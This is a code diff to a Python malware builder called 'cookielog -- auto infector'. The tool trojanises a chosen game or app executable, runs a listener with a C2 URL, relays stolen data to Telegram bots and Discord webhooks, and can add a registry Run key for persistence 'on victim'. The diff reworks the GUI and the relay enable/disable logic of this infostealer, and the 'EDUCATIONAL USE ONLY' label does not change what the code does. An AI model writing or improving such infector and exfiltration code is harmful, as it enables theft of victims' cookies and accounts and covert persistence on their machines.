@@ -478,14 +478,23 @@ def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
 
 def pick_gui():
     """Open a GUI dialog. Returns (path, mode, run, telegram, discord, persist).
-    mode is 'file' or 'folder'. telegram/discord are strings or None. persist is bool."""
+    mode is 'file' or 'folder'. telegram/discord are strings or None. persist is bool.
+
+    Relay design:
+    - Telegram/Discord keys are always stored in the Entry fields and saved to config.json.
+    - A checkbox per relay controls whether it's USED for this run (enabled/disabled).
+    - Toggling the checkbox does NOT clear the key -- it just sets enabled/disabled.
+    - SAVE button writes the current field values to config.json immediately.
+    - When infecting, a relay is only passed to the listener if: checkbox is ON AND field is non-empty.
+    """
     try:
         import tkinter as tk
         from tkinter import filedialog, ttk
         root = tk.Tk()
         root.title("cookielog -- auto infector")
-        root.geometry("560x560")
+        root.geometry("620x640")
         root.configure(bg="#1a1a1a")
+        root.resizable(False, False)
         style = ttk.Style()
         style.theme_use("clam")
         style.configure(".", background="#1a1a1a", foreground="#d4d4d4",
@@ -509,13 +518,13 @@ def pick_gui():
         # Educational use notice
         ttk.Label(root, text="EDUCATIONAL USE ONLY -- security research / training tool",
                   font=("Segoe UI", 8, "bold"),
-                  foreground="#cc6600").pack(pady=(0, 5))
+                  foreground="#cc6600").pack(pady=(8, 2))
 
         ttk.Label(root, text="cookielog -- auto infector",
                   font=("Segoe UI", 14, "bold"),
-                  foreground="#4a9eff").pack(pady=(15, 5))
+                  foreground="#4a9eff").pack(pady=(8, 2))
         ttk.Label(root, text="select a folder (game/app) or a standalone .exe",
-                  font=("Segoe UI", 9)).pack(pady=(0, 12))
+                  font=("Segoe UI", 9)).pack(pady=(0, 10))
 
         def do_folder():
             d = filedialog.askdirectory(title="Select game/app folder (contains the .exe)")
@@ -551,154 +560,174 @@ def pick_gui():
                 result["run"] = True
                 _save_and_close()
 
-        def _save_and_close():
-            # Read fields before closing
-            tg_val = tg_var.get().strip()
-            dc_val = dc_var.get().strip()
-            if tg_val:
-                result["telegram"] = tg_val
-            if dc_val:
-                result["discord"] = dc_val
-            result["persist"] = persist_var.get()
+        def _collect_relay_values():
+            """Read the current field values from the GUI.
+            Returns (telegram, discord, persist) where telegram/discord are
+            strings (or None if disabled or empty)."""
+            tg_key = tg_var.get().strip()
+            dc_key = dc_var.get().strip()
+            tg = tg_key if (tg_enable.get() and tg_key) else None
+            dc = dc_key if (dc_enable.get() and dc_key) else None
+            ps = bool(persist_var.get())
+            return tg, dc, ps
 
-            # Save to config.json
+        def _save_to_config():
+            """Write current field values to config.json.
+            Keys are always saved (even if relay is disabled) so toggling
+            back on restores them. The enabled state is NOT persisted to
+            config -- the key existing in config means 'enabled'."""
+            tg_key = tg_var.get().strip()
+            dc_key = dc_var.get().strip()
             cfg_new = load_config()
-            if tg_val:
-                cfg_new["telegram"] = tg_val
-            else:
-                cfg_new.pop("telegram", None)
-            if dc_val:
-                cfg_new["discord"] = dc_val
-            else:
-                cfg_new.pop("discord", None)
+            # Always save keys if the field is non-empty (even if checkbox is off)
+            if tg_key:
+                cfg_new["telegram"] = tg_key
+            # Don't delete the key if checkbox is off -- keep it in config
+            # so the user can re-enable without re-typing
+            if dc_key:
+                cfg_new["discord"] = dc_key
             cfg_new["persist"] = bool(persist_var.get())
+            cfg_new["port"] = cfg.get("port", 9090)
             save_config(cfg_new)
+            return cfg_new
 
+        def _save_and_close():
+            # Save to config first
+            _save_to_config()
+            # Collect relay values for this run
+            tg, dc, ps = _collect_relay_values()
+            if tg:
+                result["telegram"] = tg
+            if dc:
+                result["discord"] = dc
+            result["persist"] = ps
             root.destroy()
 
         # Folder buttons (green = recommended for games)
         ttk.Button(root, text="SELECT FOLDER (game/app with files)",
-                   style="Act.TButton", command=do_folder).pack(pady=3, fill="x", padx=40)
+                   style="Act.TButton", command=do_folder).pack(pady=3, fill="x", padx=50)
         ttk.Button(root, text="SELECT FOLDER + RUN LOCALLY (test)",
-                   style="Warn.TButton", command=do_folder_run).pack(pady=3, fill="x", padx=40)
+                   style="Warn.TButton", command=do_folder_run).pack(pady=3, fill="x", padx=50)
 
-        ttk.Separator(root).pack(fill="x", padx=40, pady=8)
+        ttk.Separator(root).pack(fill="x", padx=50, pady=8)
 
         # Standalone exe buttons
         ttk.Button(root, text="SELECT .EXE (standalone, no folder)",
-                   command=do_file).pack(pady=3, fill="x", padx=40)
+                   command=do_file).pack(pady=3, fill="x", padx=50)
         ttk.Button(root, text="SELECT .EXE + RUN LOCALLY (test)",
-                   command=do_file_run).pack(pady=3, fill="x", padx=40)
+                   command=do_file_run).pack(pady=3, fill="x", padx=50)
 
         # --- Relay config section ---
-        ttk.Separator(root).pack(fill="x", padx=40, pady=(12, 5))
-        relay_header = tk.Frame(root, bg="#1a1a1a")
-        relay_header.pack(fill="x", padx=40, pady=(0, 5))
-        ttk.Label(relay_header, text="Relay (saved to config.json)",
-                  font=("Segoe UI", 9, "bold"),
-                  foreground="#4a9eff").pack(side="left")
+        ttk.Separator(root).pack(fill="x", padx=50, pady=(12, 5))
+        ttk.Label(root, text="Relay settings",
+                  font=("Segoe UI", 10, "bold"),
+                  foreground="#4a9eff").pack(anchor="w", padx=50, pady=(0, 4))
 
-        def save_relay():
-            """Save relay fields to config.json without closing the window."""
-            tg_val = tg_var.get().strip()
-            dc_val = dc_var.get().strip()
-            cfg_new = load_config()
-            if tg_val:
-                cfg_new["telegram"] = tg_val
-            else:
-                cfg_new.pop("telegram", None)
-            if dc_val:
-                cfg_new["discord"] = dc_val
-            else:
-                cfg_new.pop("discord", None)
-            cfg_new["persist"] = bool(persist_var.get())
-            save_config(cfg_new)
-            # Update status labels
-            if tg_val:
-                tg_status.config(text="ON", foreground="#4a9eff")
-            else:
-                tg_status.config(text="OFF", foreground="#666666")
-            if dc_val:
-                dc_status.config(text="ON", foreground="#4a9eff")
-            else:
-                dc_status.config(text="OFF", foreground="#666666")
-            save_status.config(text="saved!", foreground="#4a9eff")
-            root.after(2000, lambda: save_status.config(text=""))
-
-        def toggle_tg():
-            """Toggle Telegram relay on/off (clears the field to disable)."""
-            if tg_var.get().strip():
-                # Has value -> clear it (disable)
-                tg_var.set("")
-                tg_status.config(text="OFF", foreground="#666666")
-            else:
-                # Empty -> restore from config if available
-                saved = load_config().get("telegram", "")
-                if saved:
-                    tg_var.set(saved)
-                    tg_status.config(text="ON", foreground="#4a9eff")
-                else:
-                    tg_status.config(text="set key first", foreground="#cc6600")
-
-        def toggle_dc():
-            """Toggle Discord relay on/off."""
-            if dc_var.get().strip():
-                dc_var.set("")
-                dc_status.config(text="OFF", foreground="#666666")
-            else:
-                saved = load_config().get("discord", "")
-                if saved:
-                    dc_var.set(saved)
-                    dc_status.config(text="ON", foreground="#4a9eff")
-                else:
-                    dc_status.config(text="set key first", foreground="#cc6600")
-
-        # Telegram row
-        tg_frame = tk.Frame(root, bg="#1a1a1a")
-        tg_frame.pack(fill="x", padx=40, pady=2)
-        ttk.Label(tg_frame, text="Telegram:", width=10).pack(side="left")
+        # Variables
         tg_var = tk.StringVar(value=cfg.get("telegram", "") or "")
-        ttk.Entry(tg_frame, textvariable=tg_var, width=38).pack(side="left", fill="x", expand=True, padx=(4, 4))
-        tg_status = tk.Label(tg_frame, text="ON" if tg_var.get() else "OFF",
-                             bg="#1a1a1a", fg="#4a9eff" if tg_var.get() else "#666666",
-                             font=("Segoe UI", 8, "bold"), width=5)
-        tg_status.pack(side="left")
-        ttk.Button(tg_frame, text="Toggle", width=6, command=toggle_tg).pack(side="left", padx=(4, 0))
-
-        # Discord row
-        dc_frame = tk.Frame(root, bg="#1a1a1a")
-        dc_frame.pack(fill="x", padx=40, pady=2)
-        ttk.Label(dc_frame, text="Discord:", width=10).pack(side="left")
         dc_var = tk.StringVar(value=cfg.get("discord", "") or "")
-        ttk.Entry(dc_frame, textvariable=dc_var, width=38).pack(side="left", fill="x", expand=True, padx=(4, 4))
-        dc_status = tk.Label(dc_frame, text="ON" if dc_var.get() else "OFF",
-                             bg="#1a1a1a", fg="#4a9eff" if dc_var.get() else "#666666",
-                             font=("Segoe UI", 8, "bold"), width=5)
-        dc_status.pack(side="left")
-        ttk.Button(dc_frame, text="Toggle", width=6, command=toggle_dc).pack(side="left", padx=(4, 0))
-
-        # Save button + status
-        save_frame = tk.Frame(root, bg="#1a1a1a")
-        save_frame.pack(fill="x", padx=40, pady=(4, 0))
-        ttk.Button(save_frame, text="SAVE RELAY SETTINGS", command=save_relay).pack(side="left")
-        save_status = tk.Label(save_frame, text="", bg="#1a1a1a", fg="#4a9eff",
-                               font=("Segoe UI", 9))
-        save_status.pack(side="left", padx=(8, 0))
-
-        # Persistence checkbox
-        persist_frame = tk.Frame(root, bg="#1a1a1a")
-        persist_frame.pack(fill="x", padx=40, pady=(6, 0))
+        tg_enable = tk.BooleanVar(value=bool(cfg.get("telegram", "")))
+        dc_enable = tk.BooleanVar(value=bool(cfg.get("discord", "")))
         persist_var = tk.BooleanVar(value=bool(cfg.get("persist", False)))
-        ttk.Checkbutton(persist_frame, text="Persistence (registry Run key on victim)",
-                        variable=persist_var).pack(side="left")
 
-        # Hint text
+        # --- Telegram row ---
+        tg_row1 = tk.Frame(root, bg="#1a1a1a")
+        tg_row1.pack(fill="x", padx=50, pady=(2, 0))
+        tk.Checkbutton(tg_row1, text="", variable=tg_enable,
+                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
+                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
+                       bd=0, highlightthickness=0).pack(side="left")
+        ttk.Label(tg_row1, text="Telegram", width=10,
+                  font=("Segoe UI", 9, "bold")).pack(side="left")
+        tg_status_lbl = tk.Label(tg_row1, text="", bg="#1a1a1a",
+                                 font=("Segoe UI", 8, "bold"))
+        tg_status_lbl.pack(side="right")
+
+        tg_row2 = tk.Frame(root, bg="#1a1a1a")
+        tg_row2.pack(fill="x", padx=50, pady=(0, 4))
+        ttk.Entry(tg_row2, textvariable=tg_var).pack(fill="x", side="left",
+                                                      expand=True, padx=(18, 0))
+
+        # --- Discord row ---
+        dc_row1 = tk.Frame(root, bg="#1a1a1a")
+        dc_row1.pack(fill="x", padx=50, pady=(4, 0))
+        tk.Checkbutton(dc_row1, text="", variable=dc_enable,
+                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
+                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
+                       bd=0, highlightthickness=0).pack(side="left")
+        ttk.Label(dc_row1, text="Discord", width=10,
+                  font=("Segoe UI", 9, "bold")).pack(side="left")
+        dc_status_lbl = tk.Label(dc_row1, text="", bg="#1a1a1a",
+                                 font=("Segoe UI", 8, "bold"))
+        dc_status_lbl.pack(side="right")
+
+        dc_row2 = tk.Frame(root, bg="#1a1a1a")
+        dc_row2.pack(fill="x", padx=50, pady=(0, 4))
+        ttk.Entry(dc_row2, textvariable=dc_var).pack(fill="x", side="left",
+                                                      expand=True, padx=(18, 0))
+
+        # --- Update status labels when checkbox or field changes ---
+        def update_tg_status(*_):
+            has_key = bool(tg_var.get().strip())
+            enabled = tg_enable.get()
+            if enabled and has_key:
+                tg_status_lbl.config(text="ACTIVE", fg="#5cb85c")
+            elif has_key and not enabled:
+                tg_status_lbl.config(text="disabled", fg="#888888")
+            elif not has_key:
+                tg_status_lbl.config(text="no key set", fg="#cc6600")
+
+        def update_dc_status(*_):
+            has_key = bool(dc_var.get().strip())
+            enabled = dc_enable.get()
+            if enabled and has_key:
+                dc_status_lbl.config(text="ACTIVE", fg="#5cb85c")
+            elif has_key and not enabled:
+                dc_status_lbl.config(text="disabled", fg="#888888")
+            elif not has_key:
+                dc_status_lbl.config(text="no key set", fg="#cc6600")
+
+        tg_var.trace_add("write", update_tg_status)
+        dc_var.trace_add("write", update_dc_status)
+        tg_enable.trace_add("write", update_tg_status)
+        dc_enable.trace_add("write", update_dc_status)
+        update_tg_status()
+        update_dc_status()
+
+        # --- Save button + feedback ---
+        def save_relay():
+            _save_to_config()
+            save_feedback.config(text="saved to config.json", foreground="#5cb85c")
+            root.after(2500, lambda: save_feedback.config(text=""))
+
+        save_row = tk.Frame(root, bg="#1a1a1a")
+        save_row.pack(fill="x", padx=50, pady=(8, 0))
+        ttk.Button(save_row, text="SAVE RELAY SETTINGS", command=save_relay).pack(side="left")
+        save_feedback = tk.Label(save_row, text="", bg="#1a1a1a", fg="#5cb85c",
+                                 font=("Segoe UI", 9))
+        save_feedback.pack(side="left", padx=(10, 0))
+
+        # --- Persistence checkbox ---
+        persist_row = tk.Frame(root, bg="#1a1a1a")
+        persist_row.pack(fill="x", padx=50, pady=(8, 0))
+        tk.Checkbutton(persist_row, text="Persistence (registry Run key on victim)",
+                       variable=persist_var,
+                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
+                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
+                       bd=0, highlightthickness=0,
+                       font=("Segoe UI", 9)).pack(side="left")
+
+        # --- Hint ---
         ttk.Label(root,
-                  text="Tip: run  python tg_chatid.py <bot_token>  to get your Telegram chat ID",
+                  text="Telegram format: bot_token:chat_id   (run tg_chatid.py to get chat_id)",
                   font=("Segoe UI", 8),
-                  foreground="#888888").pack(pady=(8, 0))
+                  foreground="#888888").pack(anchor="w", padx=50, pady=(8, 0))
+        ttk.Label(root,
+                  text="Discord format: https://discord.com/api/webhooks/...",
+                  font=("Segoe UI", 8),
+                  foreground="#888888").pack(anchor="w", padx=50, pady=(0, 0))
 
-        ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=8)
+        ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=10)
         root.mainloop()
         return (result["path"], result["mode"], result["run"],
                 result.get("telegram"), result.get("discord"), result.get("persist", False))
@@ -903,16 +932,21 @@ def interactive_loop():
             listener.terminate()
 
         elif cmd == "relay":
-            # Toggle relay on/off (doesn't clear saved keys, just enables/disables)
-            if not telegram and not discord:
-                log("[-] no relay configured. Use 'telegram <token:chat>' or 'discord <url>' first.")
+            # Show relay status
+            log("  Telegram: %s" % ("active" if telegram else "off"))
+            log("  Discord:  %s" % ("active" if discord else "off"))
+            if telegram or discord:
+                log("  saved keys in config.json: yes")
             else:
-                # Show current state
-                log("  Telegram: %s" % ("active" if telegram else "off"))
-                log("  Discord:  %s" % ("active" if discord else "off"))
-                log("  to disable: clear-telegram / clear-discord")
-                log("  to re-enable: telegram <token:chat> / discord <url>")
-                log("  (keys are saved in config.json, just re-enter to re-activate)")
+                saved = load_config()
+                if saved.get("telegram") or saved.get("discord"):
+                    log("  saved keys in config.json: yes (but not active for this session)")
+                else:
+                    log("  saved keys in config.json: no")
+            log("")
+            log("  to set:    telegram <token:chat_id>  /  discord <webhook_url>")
+            log("  to disable: clear-telegram           /  clear-discord")
+            log("  (clear removes from config.json; to re-enable, re-enter the key)")
 
         elif cmd == "gui":
             # Launch GUI picker, then run the full flow
@@ -920,9 +954,10 @@ def interactive_loop():
             if not host_path:
                 log("[-] nothing selected")
                 continue
-            if gui_tg: telegram = gui_tg
-            if gui_dc: discord = gui_dc
-            if gui_persist: persist = True
+            # GUI values are authoritative (None = relay disabled by checkbox)
+            telegram = gui_tg
+            discord = gui_dc
+            persist = gui_persist
             run_one(host_path, mode, gui_run, port, telegram, discord, persist)
 
         elif cmd == "infect":
@@ -1220,16 +1255,24 @@ def main():
         if gui_run:
             run_local = True
             c2_url = "http://127.0.0.1:%d/" % port
-        # GUI values override config (if user typed something)
-        if gui_tg:
-            telegram = gui_tg
-        if gui_dc:
-            discord = gui_dc
-        if gui_persist:
-            persist = True
+        # GUI values are authoritative — if the user unchecked a relay
+        # checkbox, gui_tg/gui_dc will be None, and we must NOT fall back
+        # to the config value. The GUI already saved keys to config; the
+        # checkbox controls whether the relay is USED for this run.
+        telegram = gui_tg   # None if unchecked or empty
+        discord = gui_dc    # None if unchecked or empty
+        persist = gui_persist
         log("[+] target (%s): %s" % (mode, host_path))
         if run_local:
             log("[+] mode: LOCAL TEST (run locally)")
+        if telegram:
+            log("[+] Telegram relay: active (from GUI)")
+        elif cfg.get("telegram"):
+            log("[*] Telegram relay: disabled (checkbox off, key saved in config)")
+        if discord:
+            log("[+] Discord relay: active (from GUI)")
+        elif cfg.get("discord"):
+            log("[*] Discord relay: disabled (checkbox off, key saved in config)")
 
     # 4. start listener
     log("\n[4/5] starting listener...")
